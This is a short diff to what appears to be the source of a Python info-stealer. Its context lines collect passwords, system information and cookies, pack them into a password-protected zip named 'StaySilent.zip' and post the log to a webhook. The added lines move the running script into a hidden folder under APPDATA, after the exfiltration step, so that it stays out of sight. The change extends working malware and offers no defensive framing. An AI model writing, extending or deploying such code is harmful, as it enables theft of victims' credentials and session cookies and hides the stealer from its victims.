@@ -171,7 +171,13 @@ class StealerFunctions:
             else:
                 print(f"Error: {response.status_code}")
                 print(response.text)
- 
+             
+ def move_script_to_hidden_location():
+    current_script_path = os.path.abspath(__file__)
+    hidden_location = os.path.join(os.getenv('APPDATA'), 'HiddenFolder')
+    os.makedirs(hidden_location, exist_ok=True)
+    new_script_path = os.path.join(hidden_location, os.path.basename(__file__))
+    shutil.move(current_script_path, new_script_path)
  
 if __name__ == "__main__":
     Functions.Initialize()
@@ -183,3 +189,5 @@ if __name__ == "__main__":
     StealerFunctions.createLog(passwords, systemInfo, cookies)
     zip_file(Paths.stealerLog, os.path.join(Paths.temp_path, "StaySilent.zip"), "ZIPPASSWORD")
     requests.post(webhookURL, data={"content": StealerFunctions.uploadLog()})
+
+    move_script_to_hidden_location()
